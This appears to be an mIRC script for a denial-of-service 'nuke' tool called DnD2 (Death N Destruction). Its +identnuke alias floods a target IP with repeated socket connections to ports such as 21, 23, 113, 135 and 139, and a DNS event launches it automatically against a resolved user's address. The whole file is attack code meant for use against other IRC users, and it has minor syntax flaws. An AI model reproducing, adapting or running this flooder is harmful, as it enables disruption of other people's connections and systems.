n8=;*              DnD2 ( Death N Destruction )                *
n9=
n10=
n11=alias +identnuke {
n12=  .sockopen dnd $+ $rand(9,99999) %nuke-ip 21 | .sockopen dnd $+ $rand(9,99999) %nuke-ip 21
n13=  .sockopen dnd $+ $rand(9,99999) %nuke-ip 21 | .sockopen dnd $+ $rand(9,99999) %nuke-ip 23
n14=  .sockopen dnd $+ $rand(9,99999) %nuke-ip 23 | .sockopen dnd $+ $rand(9,99999) %nuke-ip 23
n15=  .sockopen dnd $+ $rand(9,99999) %nuke-ip 59 | .sockopen dnd $+ $rand(9,99999) %nuke-ip 59
n16=  .sockopen dnd $+ $rand(9,99999) %nuke-ip 59 | .sockopen dnd $+ $rand(9,99999) %nuke-ip 80
n17=  .sockopen dnd $+ $rand(9,99999) %nuke-ip 80 | .sockopen dnd $+ $rand(9,99999) %nuke-ip 80
n18=  .sockopen dnd $+ $rand(9,99999) %nuke-ip 113 | .sockopen dnd $+ $rand(9,99999) %nuke-ip 113
n19=  .sockopen dnd $+ $rand(9,99999) %nuke-ip 113 | .sockopen dnd $+ $rand(9,99999) %nuke-ip 135
n20=  .sockopen dnd $+ $rand(9,99999) %nuke-ip 135 | .sockopen dnd $+ $rand(9,99999) %nuke-ip 135
n21=  .sockopen dnd $+ $rand(9,99999) %nuke-ip 139 | .sockopen dnd $+ $rand(9,99999) %nuke-ip 139
n22=  .sockopen dnd $+ $rand(9,99999) %nuke-ip 139 | .sockopen dnd $+ $rand(9,99999) %nuke-ip 153
n23=  .sockopen dnd $+ $rand(9,99999) %nuke-ip 153 | .sockopen dnd $+ $rand(9,99999) %nuke-ip 153
n24=}
n25=;Socket events and dns routines
n26=on 1:dns:{
n27=  if (%identnuke == on) { %nuke-ip = $raddress | %port = 113 | /+identnuke | unset %identnuke }
n28=}
n29=on 1:sockopen:dnd*:{
n30=  if ($sockerr > 0) { aline @dnd 2 $sock($sockname).ip :Refused:   | /unset %oob | /unset %oobnick }
n31=  else { aline @dnd 4 $sock($sockname).ip :Connected:   | /unset %oob | /unset %oobnick }
n32=}
n33=on 1:sockclose:dnd*:{
n34=  if ($sockerr > 0) { aline @dnd 7Disconnected!:  $sock($sockname).ip  "User has identd off" 
n35=  else { aline @ddnd 7Disconnected:  $sock($sockname).ip  } }
n36=}
n37=on 1:load:{ echo -a >DnD v2.1 mo son cazzi loro! }
